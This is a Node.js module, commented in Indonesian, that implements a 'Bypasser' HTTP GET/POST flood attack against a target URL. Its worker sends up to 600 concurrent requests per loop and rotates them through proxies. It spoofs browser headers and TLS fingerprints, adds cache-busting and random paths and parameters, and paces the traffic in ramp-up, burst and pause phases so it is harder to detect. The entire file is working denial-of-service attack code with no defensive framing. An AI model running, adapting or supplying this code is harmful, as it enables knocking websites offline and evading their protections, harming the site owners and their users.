const { gotScraping } = require('@apify/got-scraping');
const url = require('url');
const crypto = require('crypto');
const { getRandomPayload, proxyList } = require('./extensions');

function runHttpAttack(targetUrl, durationSeconds, attackType) {
    const isPostAttack = attackType === 'post';
    
    const attackName = isPostAttack ? "Bypasser POST" : "Bypasser GET";

    let localSent = 0;
    let localError = 0;

    const target = url.parse(targetUrl);

    // --- Algoritma Pacing Cerdas & Manipulasi Serangan ---
    let attackState = {
        phase: 'RAMP_UP', // RAMP_UP, BURST, PAUSE, RAMP_DOWN
        phaseEndTime: Date.now() + (2000 + Math.random() * 2000),
        streams: 50,
    };
    const MAX_STREAMS = 600;
    const MIN_STREAMS = 50;

    // --- URL Fuzzing Tingkat Lanjut ---
    const commonPaths = ['/api/v2/user', '/login', '/shop/item', '/search', '/wp-admin', '/blog/post'];
    const commonParams = ['q', 'id', 'search', 'page', 'user', 'query', 'token'];

    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${target.host} selama ${durationSeconds} detik.`);

    let isAttackActive = true;
 
    const fuzzUrl = (originalUrl) => {
        let finalUrl = originalUrl;
        const fuzzChoice = Math.random();

        if (fuzzChoice < 0.1) { // 10% chance to add a fake path
            const fakePath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
            finalUrl = new url.URL(fakePath, originalUrl).href;
        } else if (fuzzChoice < 0.25) { // 15% chance to add a fake query
            const fakeParam = commonParams[Math.floor(Math.random() * commonParams.length)];
            const fakeValue = crypto.randomBytes(8).toString('hex');
            finalUrl += (finalUrl.includes('?') ? '&' : '?') + `${fakeParam}=${fakeValue}`;
        } else if (fuzzChoice < 0.35) { // 10% chance to inject a path segment
            const urlObj = new url.URL(originalUrl);
            let pathSegments = urlObj.pathname.split('/').filter(Boolean);
            if (pathSegments.length > 1) {
                const injectIndex = 1 + Math.floor(Math.random() * (pathSegments.length - 1));
                pathSegments.splice(injectIndex, 0, crypto.randomBytes(4).toString('hex'));
                urlObj.pathname = '/' + pathSegments.join('/');
                finalUrl = urlObj.href;
            }
        }
        // 65% sisanya menyerang URL asli (dengan cache-busting di bawah)

        const cacheBustingParam = `_=${crypto.randomBytes(6).toString('hex')}`;
        return finalUrl + (finalUrl.includes('?') ? '&' : '?') + cacheBustingParam;
    };

    const attack = () => {
        const finalUrl = fuzzUrl(targetUrl);
        
        // got-scraping menangani header, sidik jari TLS, dan cookie secara otomatis.
        const options = {
            // Pilih generator header acak (chrome, firefox, etc.)
            headerGeneratorOptions: {
                browsers: [
                    { name: 'chrome', minVersion: 120 },
                    { name: 'firefox', minVersion: 120 },
                ],
                devices: ['desktop'],
                operatingSystems: ['windows', 'macos'],
            },
            // Gunakan proxy jika tersedia
            proxyUrl: proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined,
            timeout: { request: 15000 },
            retry: { limit: 0 }, // Jangan coba lagi jika gagal, langsung hitung sebagai error
        };

        localSent++;

        if (isPostAttack) {
            const { payload, type } = getRandomPayload();
            if (type === 'json') {
                options.json = payload;
            } else {
                options.form = payload;
            }
            gotScraping.post(finalUrl, options).catch(() => { localError++; });
        } else {
            gotScraping.get(finalUrl, options).catch(() => { localError++; });
        }
    };
 
    const attackLoop = () => {
        if (!isAttackActive) return;

        // Terapkan Algoritma Pacing Cerdas
        if (Date.now() > attackState.phaseEndTime) {
            switch (attackState.phase) {
                case 'RAMP_UP':
                    attackState.phase = 'BURST';
                    attackState.phaseEndTime = Date.now() + (7000 + Math.random() * 5000); // Burst for 7-12s
                    break;
                case 'BURST':
                    attackState.phase = Math.random() > 0.5 ? 'PAUSE' : 'RAMP_DOWN';
                    attackState.phaseEndTime = Date.now() + (1000 + Math.random() * 2000); // Pause/Ramp for 1-3s
                    break;
                case 'PAUSE':
                case 'RAMP_DOWN':
                    attackState.phase = 'RAMP_UP';
                    attackState.phaseEndTime = Date.now() + (2000 + Math.random() * 2000); // Ramp up for 2-4s
                    break;
            }
        }

        // Sesuaikan jumlah stream berdasarkan fase
        switch (attackState.phase) {
            case 'RAMP_UP':
                attackState.streams = Math.min(MAX_STREAMS, attackState.streams + 25);
                break;
            case 'BURST':
                attackState.streams = MAX_STREAMS;
                break;
            case 'PAUSE':
                attackState.streams = MIN_STREAMS;
                break;
            case 'RAMP_DOWN':
                attackState.streams = Math.max(MIN_STREAMS, attackState.streams - 25);
                break;
        }
        const streamsThisLoop = Math.floor(attackState.streams);

        for (let i = 0; i < streamsThisLoop; i++) {
            attack();
        }

        // Gunakan setTimeout dengan delay kecil untuk mencegah event loop blocking.
        // Ini memastikan bahwa timer lain (seperti statsInterval) mendapat kesempatan untuk berjalan,
        // sehingga laporan menjadi lebih akurat dan real-time.
        setTimeout(attackLoop, 1);
    };

    // Lapor statistik secara berkala setiap 5 detik
    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }
        localSent = 0;
        localError = 0;
    }, 5000);

    attackLoop();

    setTimeout(() => {
        isAttackActive = false;
        clearInterval(statsInterval);

        // Kirim sisa statistik sebelum keluar
        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${target.host}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

module.exports = { runHttpAttack };